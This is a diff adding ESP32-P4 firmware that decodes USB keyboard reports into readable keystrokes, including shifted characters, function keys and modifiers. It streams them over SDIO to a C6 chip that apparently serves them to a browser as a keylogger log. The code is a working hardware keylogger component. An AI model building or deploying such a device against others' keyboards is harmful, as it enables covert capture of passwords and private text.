@@ -1,0 +1,331 @@
+// P4-side transport to the C6 keylogger web UI — over SDIO on the already-
+// wired M-EXT bus. Public API (c6_uart_*) is unchanged so callers stay the
+// same; the underlying wire is different.
+//
+// Wiring (P4 host  <->  C6 slave on ESP32-P4-MINI-B-M-EXT):
+//     GPIO18  CLK   ->  GPIO19
+//     GPIO19  CMD   ->  GPIO18
+//     GPIO14  D0    ->  GPIO20
+//     GPIO15  D1    ->  GPIO21
+//     GPIO16  D2    ->  GPIO22
+//     GPIO17  D3    ->  GPIO23
+//     GPIO54  RESET ->  EN
+// These are the same lines ESP-Hosted uses when the stock firmware is on the C6.
+
+#include "c6_uart.h"
+
+#include <string.h>
+#include <stdio.h>
+
+#include "esp_log.h"
+#include "esp_err.h"
+#include "esp_heap_caps.h"
+#include "driver/gpio.h"
+#include "driver/sdmmc_host.h"
+#include "sdmmc_cmd.h"
+#include "freertos/FreeRTOS.h"
+#include "freertos/task.h"
+#include "freertos/semphr.h"
+
+#define C6_RESET_PIN 54
+
+// The ESP32 sdio_slave receive path — the CMD53 write address must be
+// (0x1F800 - length) mod 0x20000. That’s the FIFO tail address convention
+// the ESP32 slave IP uses; sdio_slave_recv() gives us whatever bytes the
+// master pushes here.
+#define SDIO_SLAVE_WRITE_ADDR_END  0x1F800
+
+static const char *TAG = "c6sdio";
+static bool s_ready;
+static SemaphoreHandle_t s_lock;
+static sdmmc_card_t     *s_card;
+static uint8_t s_prev_keys[6];
+static uint8_t s_prev_mod = 0;
+static bool    s_kbd_seen_connected;    // sticky: emitted CONNECT once
+static bool    s_mouse_seen_connected;
+
+static void reset_c6(void) {
+    gpio_reset_pin(C6_RESET_PIN);
+    gpio_set_direction(C6_RESET_PIN, GPIO_MODE_OUTPUT);
+    gpio_set_level(C6_RESET_PIN, 0);
+    vTaskDelay(pdMS_TO_TICKS(80));
+    gpio_set_level(C6_RESET_PIN, 1);
+    vTaskDelay(pdMS_TO_TICKS(2500));    // give C6 time to boot into keylogger fw
+}
+
+static esp_err_t sdio_link_bring_up(void) {
+    ESP_LOGI(TAG, "[1/6] reset C6 via GPIO%d", C6_RESET_PIN);
+    reset_c6();
+
+    sdmmc_host_t host = SDMMC_HOST_DEFAULT();
+    host.slot = SDMMC_HOST_SLOT_1;
+    // ALLOC_ALIGNED_BUF: let the driver copy our small packets into an internal
+    // cache-aligned DMA buffer. Without it, unaligned buffers trip INVALID_ARG.
+    host.flags = SDMMC_HOST_FLAG_4BIT | SDMMC_HOST_FLAG_ALLOC_ALIGNED_BUF;
+    host.max_freq_khz = SDMMC_FREQ_DEFAULT;
+    sdmmc_slot_config_t slot = SDMMC_SLOT_CONFIG_DEFAULT();
+    slot.clk = 18; slot.cmd = 19;
+    slot.d0 = 14;  slot.d1 = 15; slot.d2 = 16; slot.d3 = 17;
+    slot.width = 4;
+    slot.flags = SDMMC_SLOT_FLAG_INTERNAL_PULLUP;
+
+    ESP_LOGI(TAG, "[2/6] sdmmc_host_init");
+    esp_err_t err = sdmmc_host_init();
+    if (err != ESP_OK) { ESP_LOGE(TAG, "sdmmc_host_init: %s", esp_err_to_name(err)); return err; }
+
+    ESP_LOGI(TAG, "[3/6] sdmmc_host_init_slot SLOT_%d CLK=%d CMD=%d D0-3=%d/%d/%d/%d w=%d",
+             host.slot, slot.clk, slot.cmd, slot.d0, slot.d1, slot.d2, slot.d3, slot.width);
+    err = sdmmc_host_init_slot(host.slot, &slot);
+    if (err != ESP_OK) { ESP_LOGE(TAG, "sdmmc_host_init_slot: %s", esp_err_to_name(err)); return err; }
+
+    s_card = calloc(1, sizeof(sdmmc_card_t));
+    if (!s_card) return ESP_ERR_NO_MEM;
+
+    ESP_LOGI(TAG, "[4/6] sdmmc_card_init (probe C6 slave)");
+    err = sdmmc_card_init(&host, s_card);
+    if (err != ESP_OK) { ESP_LOGE(TAG, "sdmmc_card_init: %s", esp_err_to_name(err)); return err; }
+    ESP_LOGI(TAG, "    card OK: is_sdio=%d n_io_funcs=%d rca=0x%04x",
+             s_card->is_sdio, s_card->num_io_functions, s_card->rca);
+
+    ESP_LOGI(TAG, "[5/6] enable Function 1 (SDIO slave data path)");
+    // CCCR IOEx bit1 = enable Function 1
+    uint8_t ioe = 0;
+    err = sdmmc_io_read_byte (s_card, 0, 0x02, &ioe);        // SD_IO_CCCR_FN_ENABLE
+    if (err != ESP_OK) { ESP_LOGE(TAG, "read IOE: %s", esp_err_to_name(err)); return err; }
+    ioe |= 0x02;
+    err = sdmmc_io_write_byte(s_card, 0, 0x02, ioe, &ioe);
+    if (err != ESP_OK) { ESP_LOGE(TAG, "write IOE: %s", esp_err_to_name(err)); return err; }
+    ESP_LOGI(TAG, "    IOE = 0x%02x", ioe);
+
+    // wait for IOR bit1 to become 1
+    for (int i = 0; i < 20; i++) {
+        uint8_t ior = 0;
+        sdmmc_io_read_byte(s_card, 0, 0x03, &ior);           // SD_IO_CCCR_FN_READY
+        if (ior & 0x02) { ESP_LOGI(TAG, "    IOR = 0x%02x (Function 1 ready)", ior); break; }
+        vTaskDelay(pdMS_TO_TICKS(50));
+    }
+
+    ESP_LOGI(TAG, "[6/6] set Function 1 block size = 512");
+    // CCCR block-size regs for Function 1 are at 0x110-0x111
+    err = sdmmc_io_write_byte(s_card, 0, 0x110, 0x00, NULL);
+    if (err == ESP_OK) err = sdmmc_io_write_byte(s_card, 0, 0x111, 0x02, NULL);
+    if (err != ESP_OK) ESP_LOGW(TAG, "set block size: %s", esp_err_to_name(err));
+
+    ESP_LOGI(TAG, "SDIO link to C6 up (raw CMD52/53 mode)");
+    return ESP_OK;
+}
+
+// Send a single line (short packet) to the C6 slave via CMD53 byte-mode write.
+// The slave's sdio_slave_recv() will deliver the padded packet to us.
+static esp_err_t sdio_raw_send(const uint8_t *buf, size_t len) {
+    if (!s_card) return ESP_ERR_INVALID_STATE;
+    // Byte-mode CMD53 requires the write length to be a multiple of 4.
+    size_t padded = (len + 3) & ~3u;
+    if (padded > 512) padded = 512;
+    // Extra bytes past 'len' in our DMA buffer are zeroes (we zero on prep),
+    // so no garbage leaks into the slave.
+    return sdmmc_io_write_bytes(s_card, 1,
+        SDIO_SLAVE_WRITE_ADDR_END - padded, (void *)buf, padded);
+}
+
+static bool keycode_was_pressed(uint8_t kc) {
+    for (int i = 0; i < 6; i++) if (s_prev_keys[i] == kc) return true;
+    return false;
+}
+
+// US QWERTY layout, HID Usage Table page 0x07.
+// Covers the full 0x04..0x67 range that a boot-report keyboard sends.
+static const char kb_unshifted[128] = {
+    // 0x04..0x1d: a..z
+    [0x04]='a',[0x05]='b',[0x06]='c',[0x07]='d',[0x08]='e',[0x09]='f',
+    [0x0a]='g',[0x0b]='h',[0x0c]='i',[0x0d]='j',[0x0e]='k',[0x0f]='l',
+    [0x10]='m',[0x11]='n',[0x12]='o',[0x13]='p',[0x14]='q',[0x15]='r',
+    [0x16]='s',[0x17]='t',[0x18]='u',[0x19]='v',[0x1a]='w',[0x1b]='x',
+    [0x1c]='y',[0x1d]='z',
+    // 0x1e..0x27: 1..0
+    [0x1e]='1',[0x1f]='2',[0x20]='3',[0x21]='4',[0x22]='5',[0x23]='6',
+    [0x24]='7',[0x25]='8',[0x26]='9',[0x27]='0',
+    // 0x2c..0x38: punctuation
+    [0x2c]=' ',[0x2d]='-',[0x2e]='=',[0x2f]='[',[0x30]=']',[0x31]='\\',
+    [0x33]=';',[0x34]='\'',[0x35]='`',[0x36]=',',[0x37]='.',[0x38]='/',
+    // 0x54..0x63: keypad printable (assumes NumLock ON)
+    [0x54]='/',[0x55]='*',[0x56]='-',[0x57]='+',
+    [0x59]='1',[0x5a]='2',[0x5b]='3',[0x5c]='4',[0x5d]='5',
+    [0x5e]='6',[0x5f]='7',[0x60]='8',[0x61]='9',[0x62]='0',[0x63]='.',
+    // 0x64: non-US backslash
+    [0x64]='\\',
+    // 0x67: keypad = (rare, on Mac keyboards)
+    [0x67]='=',
+};
+static const char kb_shifted[128] = {
+    [0x04]='A',[0x05]='B',[0x06]='C',[0x07]='D',[0x08]='E',[0x09]='F',
+    [0x0a]='G',[0x0b]='H',[0x0c]='I',[0x0d]='J',[0x0e]='K',[0x0f]='L',
+    [0x10]='M',[0x11]='N',[0x12]='O',[0x13]='P',[0x14]='Q',[0x15]='R',
+    [0x16]='S',[0x17]='T',[0x18]='U',[0x19]='V',[0x1a]='W',[0x1b]='X',
+    [0x1c]='Y',[0x1d]='Z',
+    [0x1e]='!',[0x1f]='@',[0x20]='#',[0x21]='$',[0x22]='%',[0x23]='^',
+    [0x24]='&',[0x25]='*',[0x26]='(',[0x27]=')',
+    [0x2c]=' ',[0x2d]='_',[0x2e]='+',[0x2f]='{',[0x30]='}',[0x31]='|',
+    [0x33]=':',[0x34]='"',[0x35]='~',[0x36]='<',[0x37]='>',[0x38]='?',
+    // Keypad ignores shift on Windows — mirror unshifted so we don't lie
+    [0x54]='/',[0x55]='*',[0x56]='-',[0x57]='+',
+    [0x59]='1',[0x5a]='2',[0x5b]='3',[0x5c]='4',[0x5d]='5',
+    [0x5e]='6',[0x5f]='7',[0x60]='8',[0x61]='9',[0x62]='0',[0x63]='.',
+    [0x64]='|',
+    [0x67]='=',
+};
+
+// Non-printable keys are rendered as [NAME] in the log.
+static const char *kb_special(uint8_t kc) {
+    switch (kc) {
+    case 0x28: return "\n";           // Enter -> real newline
+    case 0x29: return "[ESC]";
+    case 0x2a: return "[BACKSPACE]";
+    case 0x2b: return "[TAB]";
+    case 0x39: return "[CAPS]";
+    case 0x3a: return "[F1]";  case 0x3b: return "[F2]";  case 0x3c: return "[F3]";
+    case 0x3d: return "[F4]";  case 0x3e: return "[F5]";  case 0x3f: return "[F6]";
+    case 0x40: return "[F7]";  case 0x41: return "[F8]";  case 0x42: return "[F9]";
+    case 0x43: return "[F10]"; case 0x44: return "[F11]"; case 0x45: return "[F12]";
+    case 0x46: return "[PRTSC]";
+    case 0x47: return "[SCROLL]";
+    case 0x48: return "[PAUSE]";
+    case 0x49: return "[INS]";
+    case 0x4a: return "[HOME]";
+    case 0x4b: return "[PGUP]";
+    case 0x4c: return "[DEL]";
+    case 0x4d: return "[END]";
+    case 0x4e: return "[PGDN]";
+    case 0x4f: return "[RIGHT]";
+    case 0x50: return "[LEFT]";
+    case 0x51: return "[DOWN]";
+    case 0x52: return "[UP]";
+    case 0x53: return "[NUMLOCK]";
+    case 0x58: return "\n";           // Keypad Enter -> real newline
+    case 0x65: return "[MENU]";       // right-click / application key
+    case 0x66: return "[POWER]";
+    // Language / editing keys (rare, but let's cover them)
+    case 0x68: return "[F13]"; case 0x69: return "[F14]"; case 0x6a: return "[F15]";
+    case 0x6b: return "[F16]"; case 0x6c: return "[F17]"; case 0x6d: return "[F18]";
+    case 0x6e: return "[F19]"; case 0x6f: return "[F20]"; case 0x70: return "[F21]";
+    case 0x71: return "[F22]"; case 0x72: return "[F23]"; case 0x73: return "[F24]";
+    case 0x79: return "[AGAIN]";  case 0x7a: return "[UNDO]";
+    case 0x7b: return "[CUT]";    case 0x7c: return "[COPY]"; case 0x7d: return "[PASTE]";
+    case 0x7e: return "[FIND]";
+    case 0x7f: return "[MUTE]";   case 0x80: return "[VOL+]"; case 0x81: return "[VOL-]";
+    default:   return NULL;
+    }
+}
+
+// Modifier byte bit -> name (in order LCTRL,LSHIFT,LALT,LWIN,RCTRL,RSHIFT,RALT,RWIN)
+static const char *mod_names[8] = {
+    "[LCTRL]", "[LSHIFT]", "[LALT]", "[WINDOWS]",
+    "[RCTRL]", "[RSHIFT]", "[RALT]", "[RWINDOWS]",
+};
+
+// Reusable DMA-capable buffer, avoids per-line heap_caps_malloc thrash.
+static uint8_t *s_tx_dma;
+#define TX_DMA_SZ 256
+
+static void tx_line(const char *prefix, const char *body) {
+    if (!s_ready) return;
+    xSemaphoreTake(s_lock, portMAX_DELAY);
+    // Zero the whole buffer so 4-byte-padded CMD53 tail has no garbage.
+    memset(s_tx_dma, 0, TX_DMA_SZ);
+    int n;
+    if (body && *body) n = snprintf((char*)s_tx_dma, TX_DMA_SZ, "%s %s\n", prefix, body);
+    else               n = snprintf((char*)s_tx_dma, TX_DMA_SZ, "%s\n", prefix);
+    if (n > 0 && n < TX_DMA_SZ) {
+        esp_err_t err = sdio_raw_send(s_tx_dma, (size_t)n);
+        if (err != ESP_OK) ESP_LOGW(TAG, "sdio_raw_send(%d): %s", n, esp_err_to_name(err));
+    }
+    xSemaphoreGive(s_lock);
+}
+
+// Periodic status heartbeat: re-announces the current HID device presence so
+// a browser that connects late (or a client that only became ready after the
+// physical keyboard plugged in) still gets the right pill colors. Sent as a
+// normal EVT so it's parsed on the C6 the same way.
+static void alive_task(void *arg) {
+    (void)arg;
+    while (1) {
+        tx_line("EVT", s_kbd_seen_connected   ? "KBD_CONNECT"   : "KBD_DISCONNECT");
+        tx_line("EVT", s_mouse_seen_connected ? "MOUSE_CONNECT" : "MOUSE_DISCONNECT");
+        vTaskDelay(pdMS_TO_TICKS(10000));   // low frequency, doesn't spam
+    }
+}
+
+static void link_bringup_task(void *arg) {
+    (void)arg;
+    if (sdio_link_bring_up() != ESP_OK) {
+        ESP_LOGE(TAG, "SDIO link failed — P4->C6 disabled");
+        vTaskDelete(NULL);
+        return;
+    }
+    s_ready = true;
+    tx_line("EVT", "P4_READY");
+    xTaskCreate(alive_task, "c6sdio_alive", 3072, NULL, 3, NULL);
+    vTaskDelete(NULL);
+}
+
+void c6_uart_init(void) {
+    if (s_lock) return;
+    s_lock  = xSemaphoreCreateMutex();
+    s_tx_dma = heap_caps_malloc(TX_DMA_SZ, MALLOC_CAP_DMA);
+    if (!s_lock || !s_tx_dma) return;
+
+    // Non-blocking: SDIO bring-up runs in a task so app_main can continue and
+    // TinyUSB HID comes up even if the SDIO link is dead.
+    xTaskCreate(link_bringup_task, "c6sdio_up", 4096, NULL, 4, NULL);
+}
+
+void c6_uart_feed_kbd_report(const uint8_t *buf, size_t len) {
+    if (!s_ready || !buf || len < 8) return;
+    uint8_t mod  = buf[0];
+    const uint8_t *keys = &buf[2];
+
+    // Emit modifier press events on rising edges. Release is not shown — user
+    // wants "Hello! [WINDOWS]", not "Hello! [WINDOWS_DOWN] [WINDOWS_UP]".
+    uint8_t mod_pressed = mod & ~s_prev_mod;
+    for (int i = 0; i < 8; i++) {
+        if (mod_pressed & (1u << i)) tx_line("KEY", mod_names[i]);
+    }
+    s_prev_mod = mod;
+
+    bool shift = (mod & 0x22) != 0;   // L-shift or R-shift
+
+    for (int i = 0; i < 6; i++) {
+        uint8_t kc = keys[i];
+        if (kc == 0 || kc == 1) continue;               // 0=idle, 1=rollover
+        if (keycode_was_pressed(kc)) continue;
+
+        char c = shift ? kb_shifted[kc] : kb_unshifted[kc];
+        if (c) {
+            char body[2] = { c, 0 };
+            tx_line("KEY", body);
+        } else {
+            const char *name = kb_special(kc);
+            if (name) {
+                // Real newline goes over the wire as an escape so a single line
+                // frame stays a single line; the JS renders "\\n" as "\n".
+                if (name[0] == '\n' && name[1] == 0) tx_line("KEY", "\\n");
+                else                                  tx_line("KEY", name);
+            } else {
+                // Unmapped: show the raw usage id so nothing is lost.
+                char body[16];
+                snprintf(body, sizeof(body), "[0x%02X]", kc);
+                tx_line("KEY", body);
+            }
+        }
+    }
+    memcpy(s_prev_keys, keys, 6);
+}
+
+void c6_uart_feed_mouse_report(const uint8_t *buf, size_t len) {
+    (void)buf; (void)len;
+}
+
+void c6_uart_kbd_connect(void)     { s_kbd_seen_connected   = true;  tx_line("EVT", "KBD_CONNECT");     memset(s_prev_keys, 0, sizeof(s_prev_keys)); s_prev_mod = 0; }
+void c6_uart_kbd_disconnect(void)  { s_kbd_seen_connected   = false; tx_line("EVT", "KBD_DISCONNECT");  memset(s_prev_keys, 0, sizeof(s_prev_keys)); s_prev_mod = 0; }
+void c6_uart_mouse_connect(void)   { s_mouse_seen_connected = true;  tx_line("EVT", "MOUSE_CONNECT"); }
+void c6_uart_mouse_disconnect(void){ s_mouse_seen_connected = false; tx_line("EVT", "MOUSE_DISCONNECT"); }
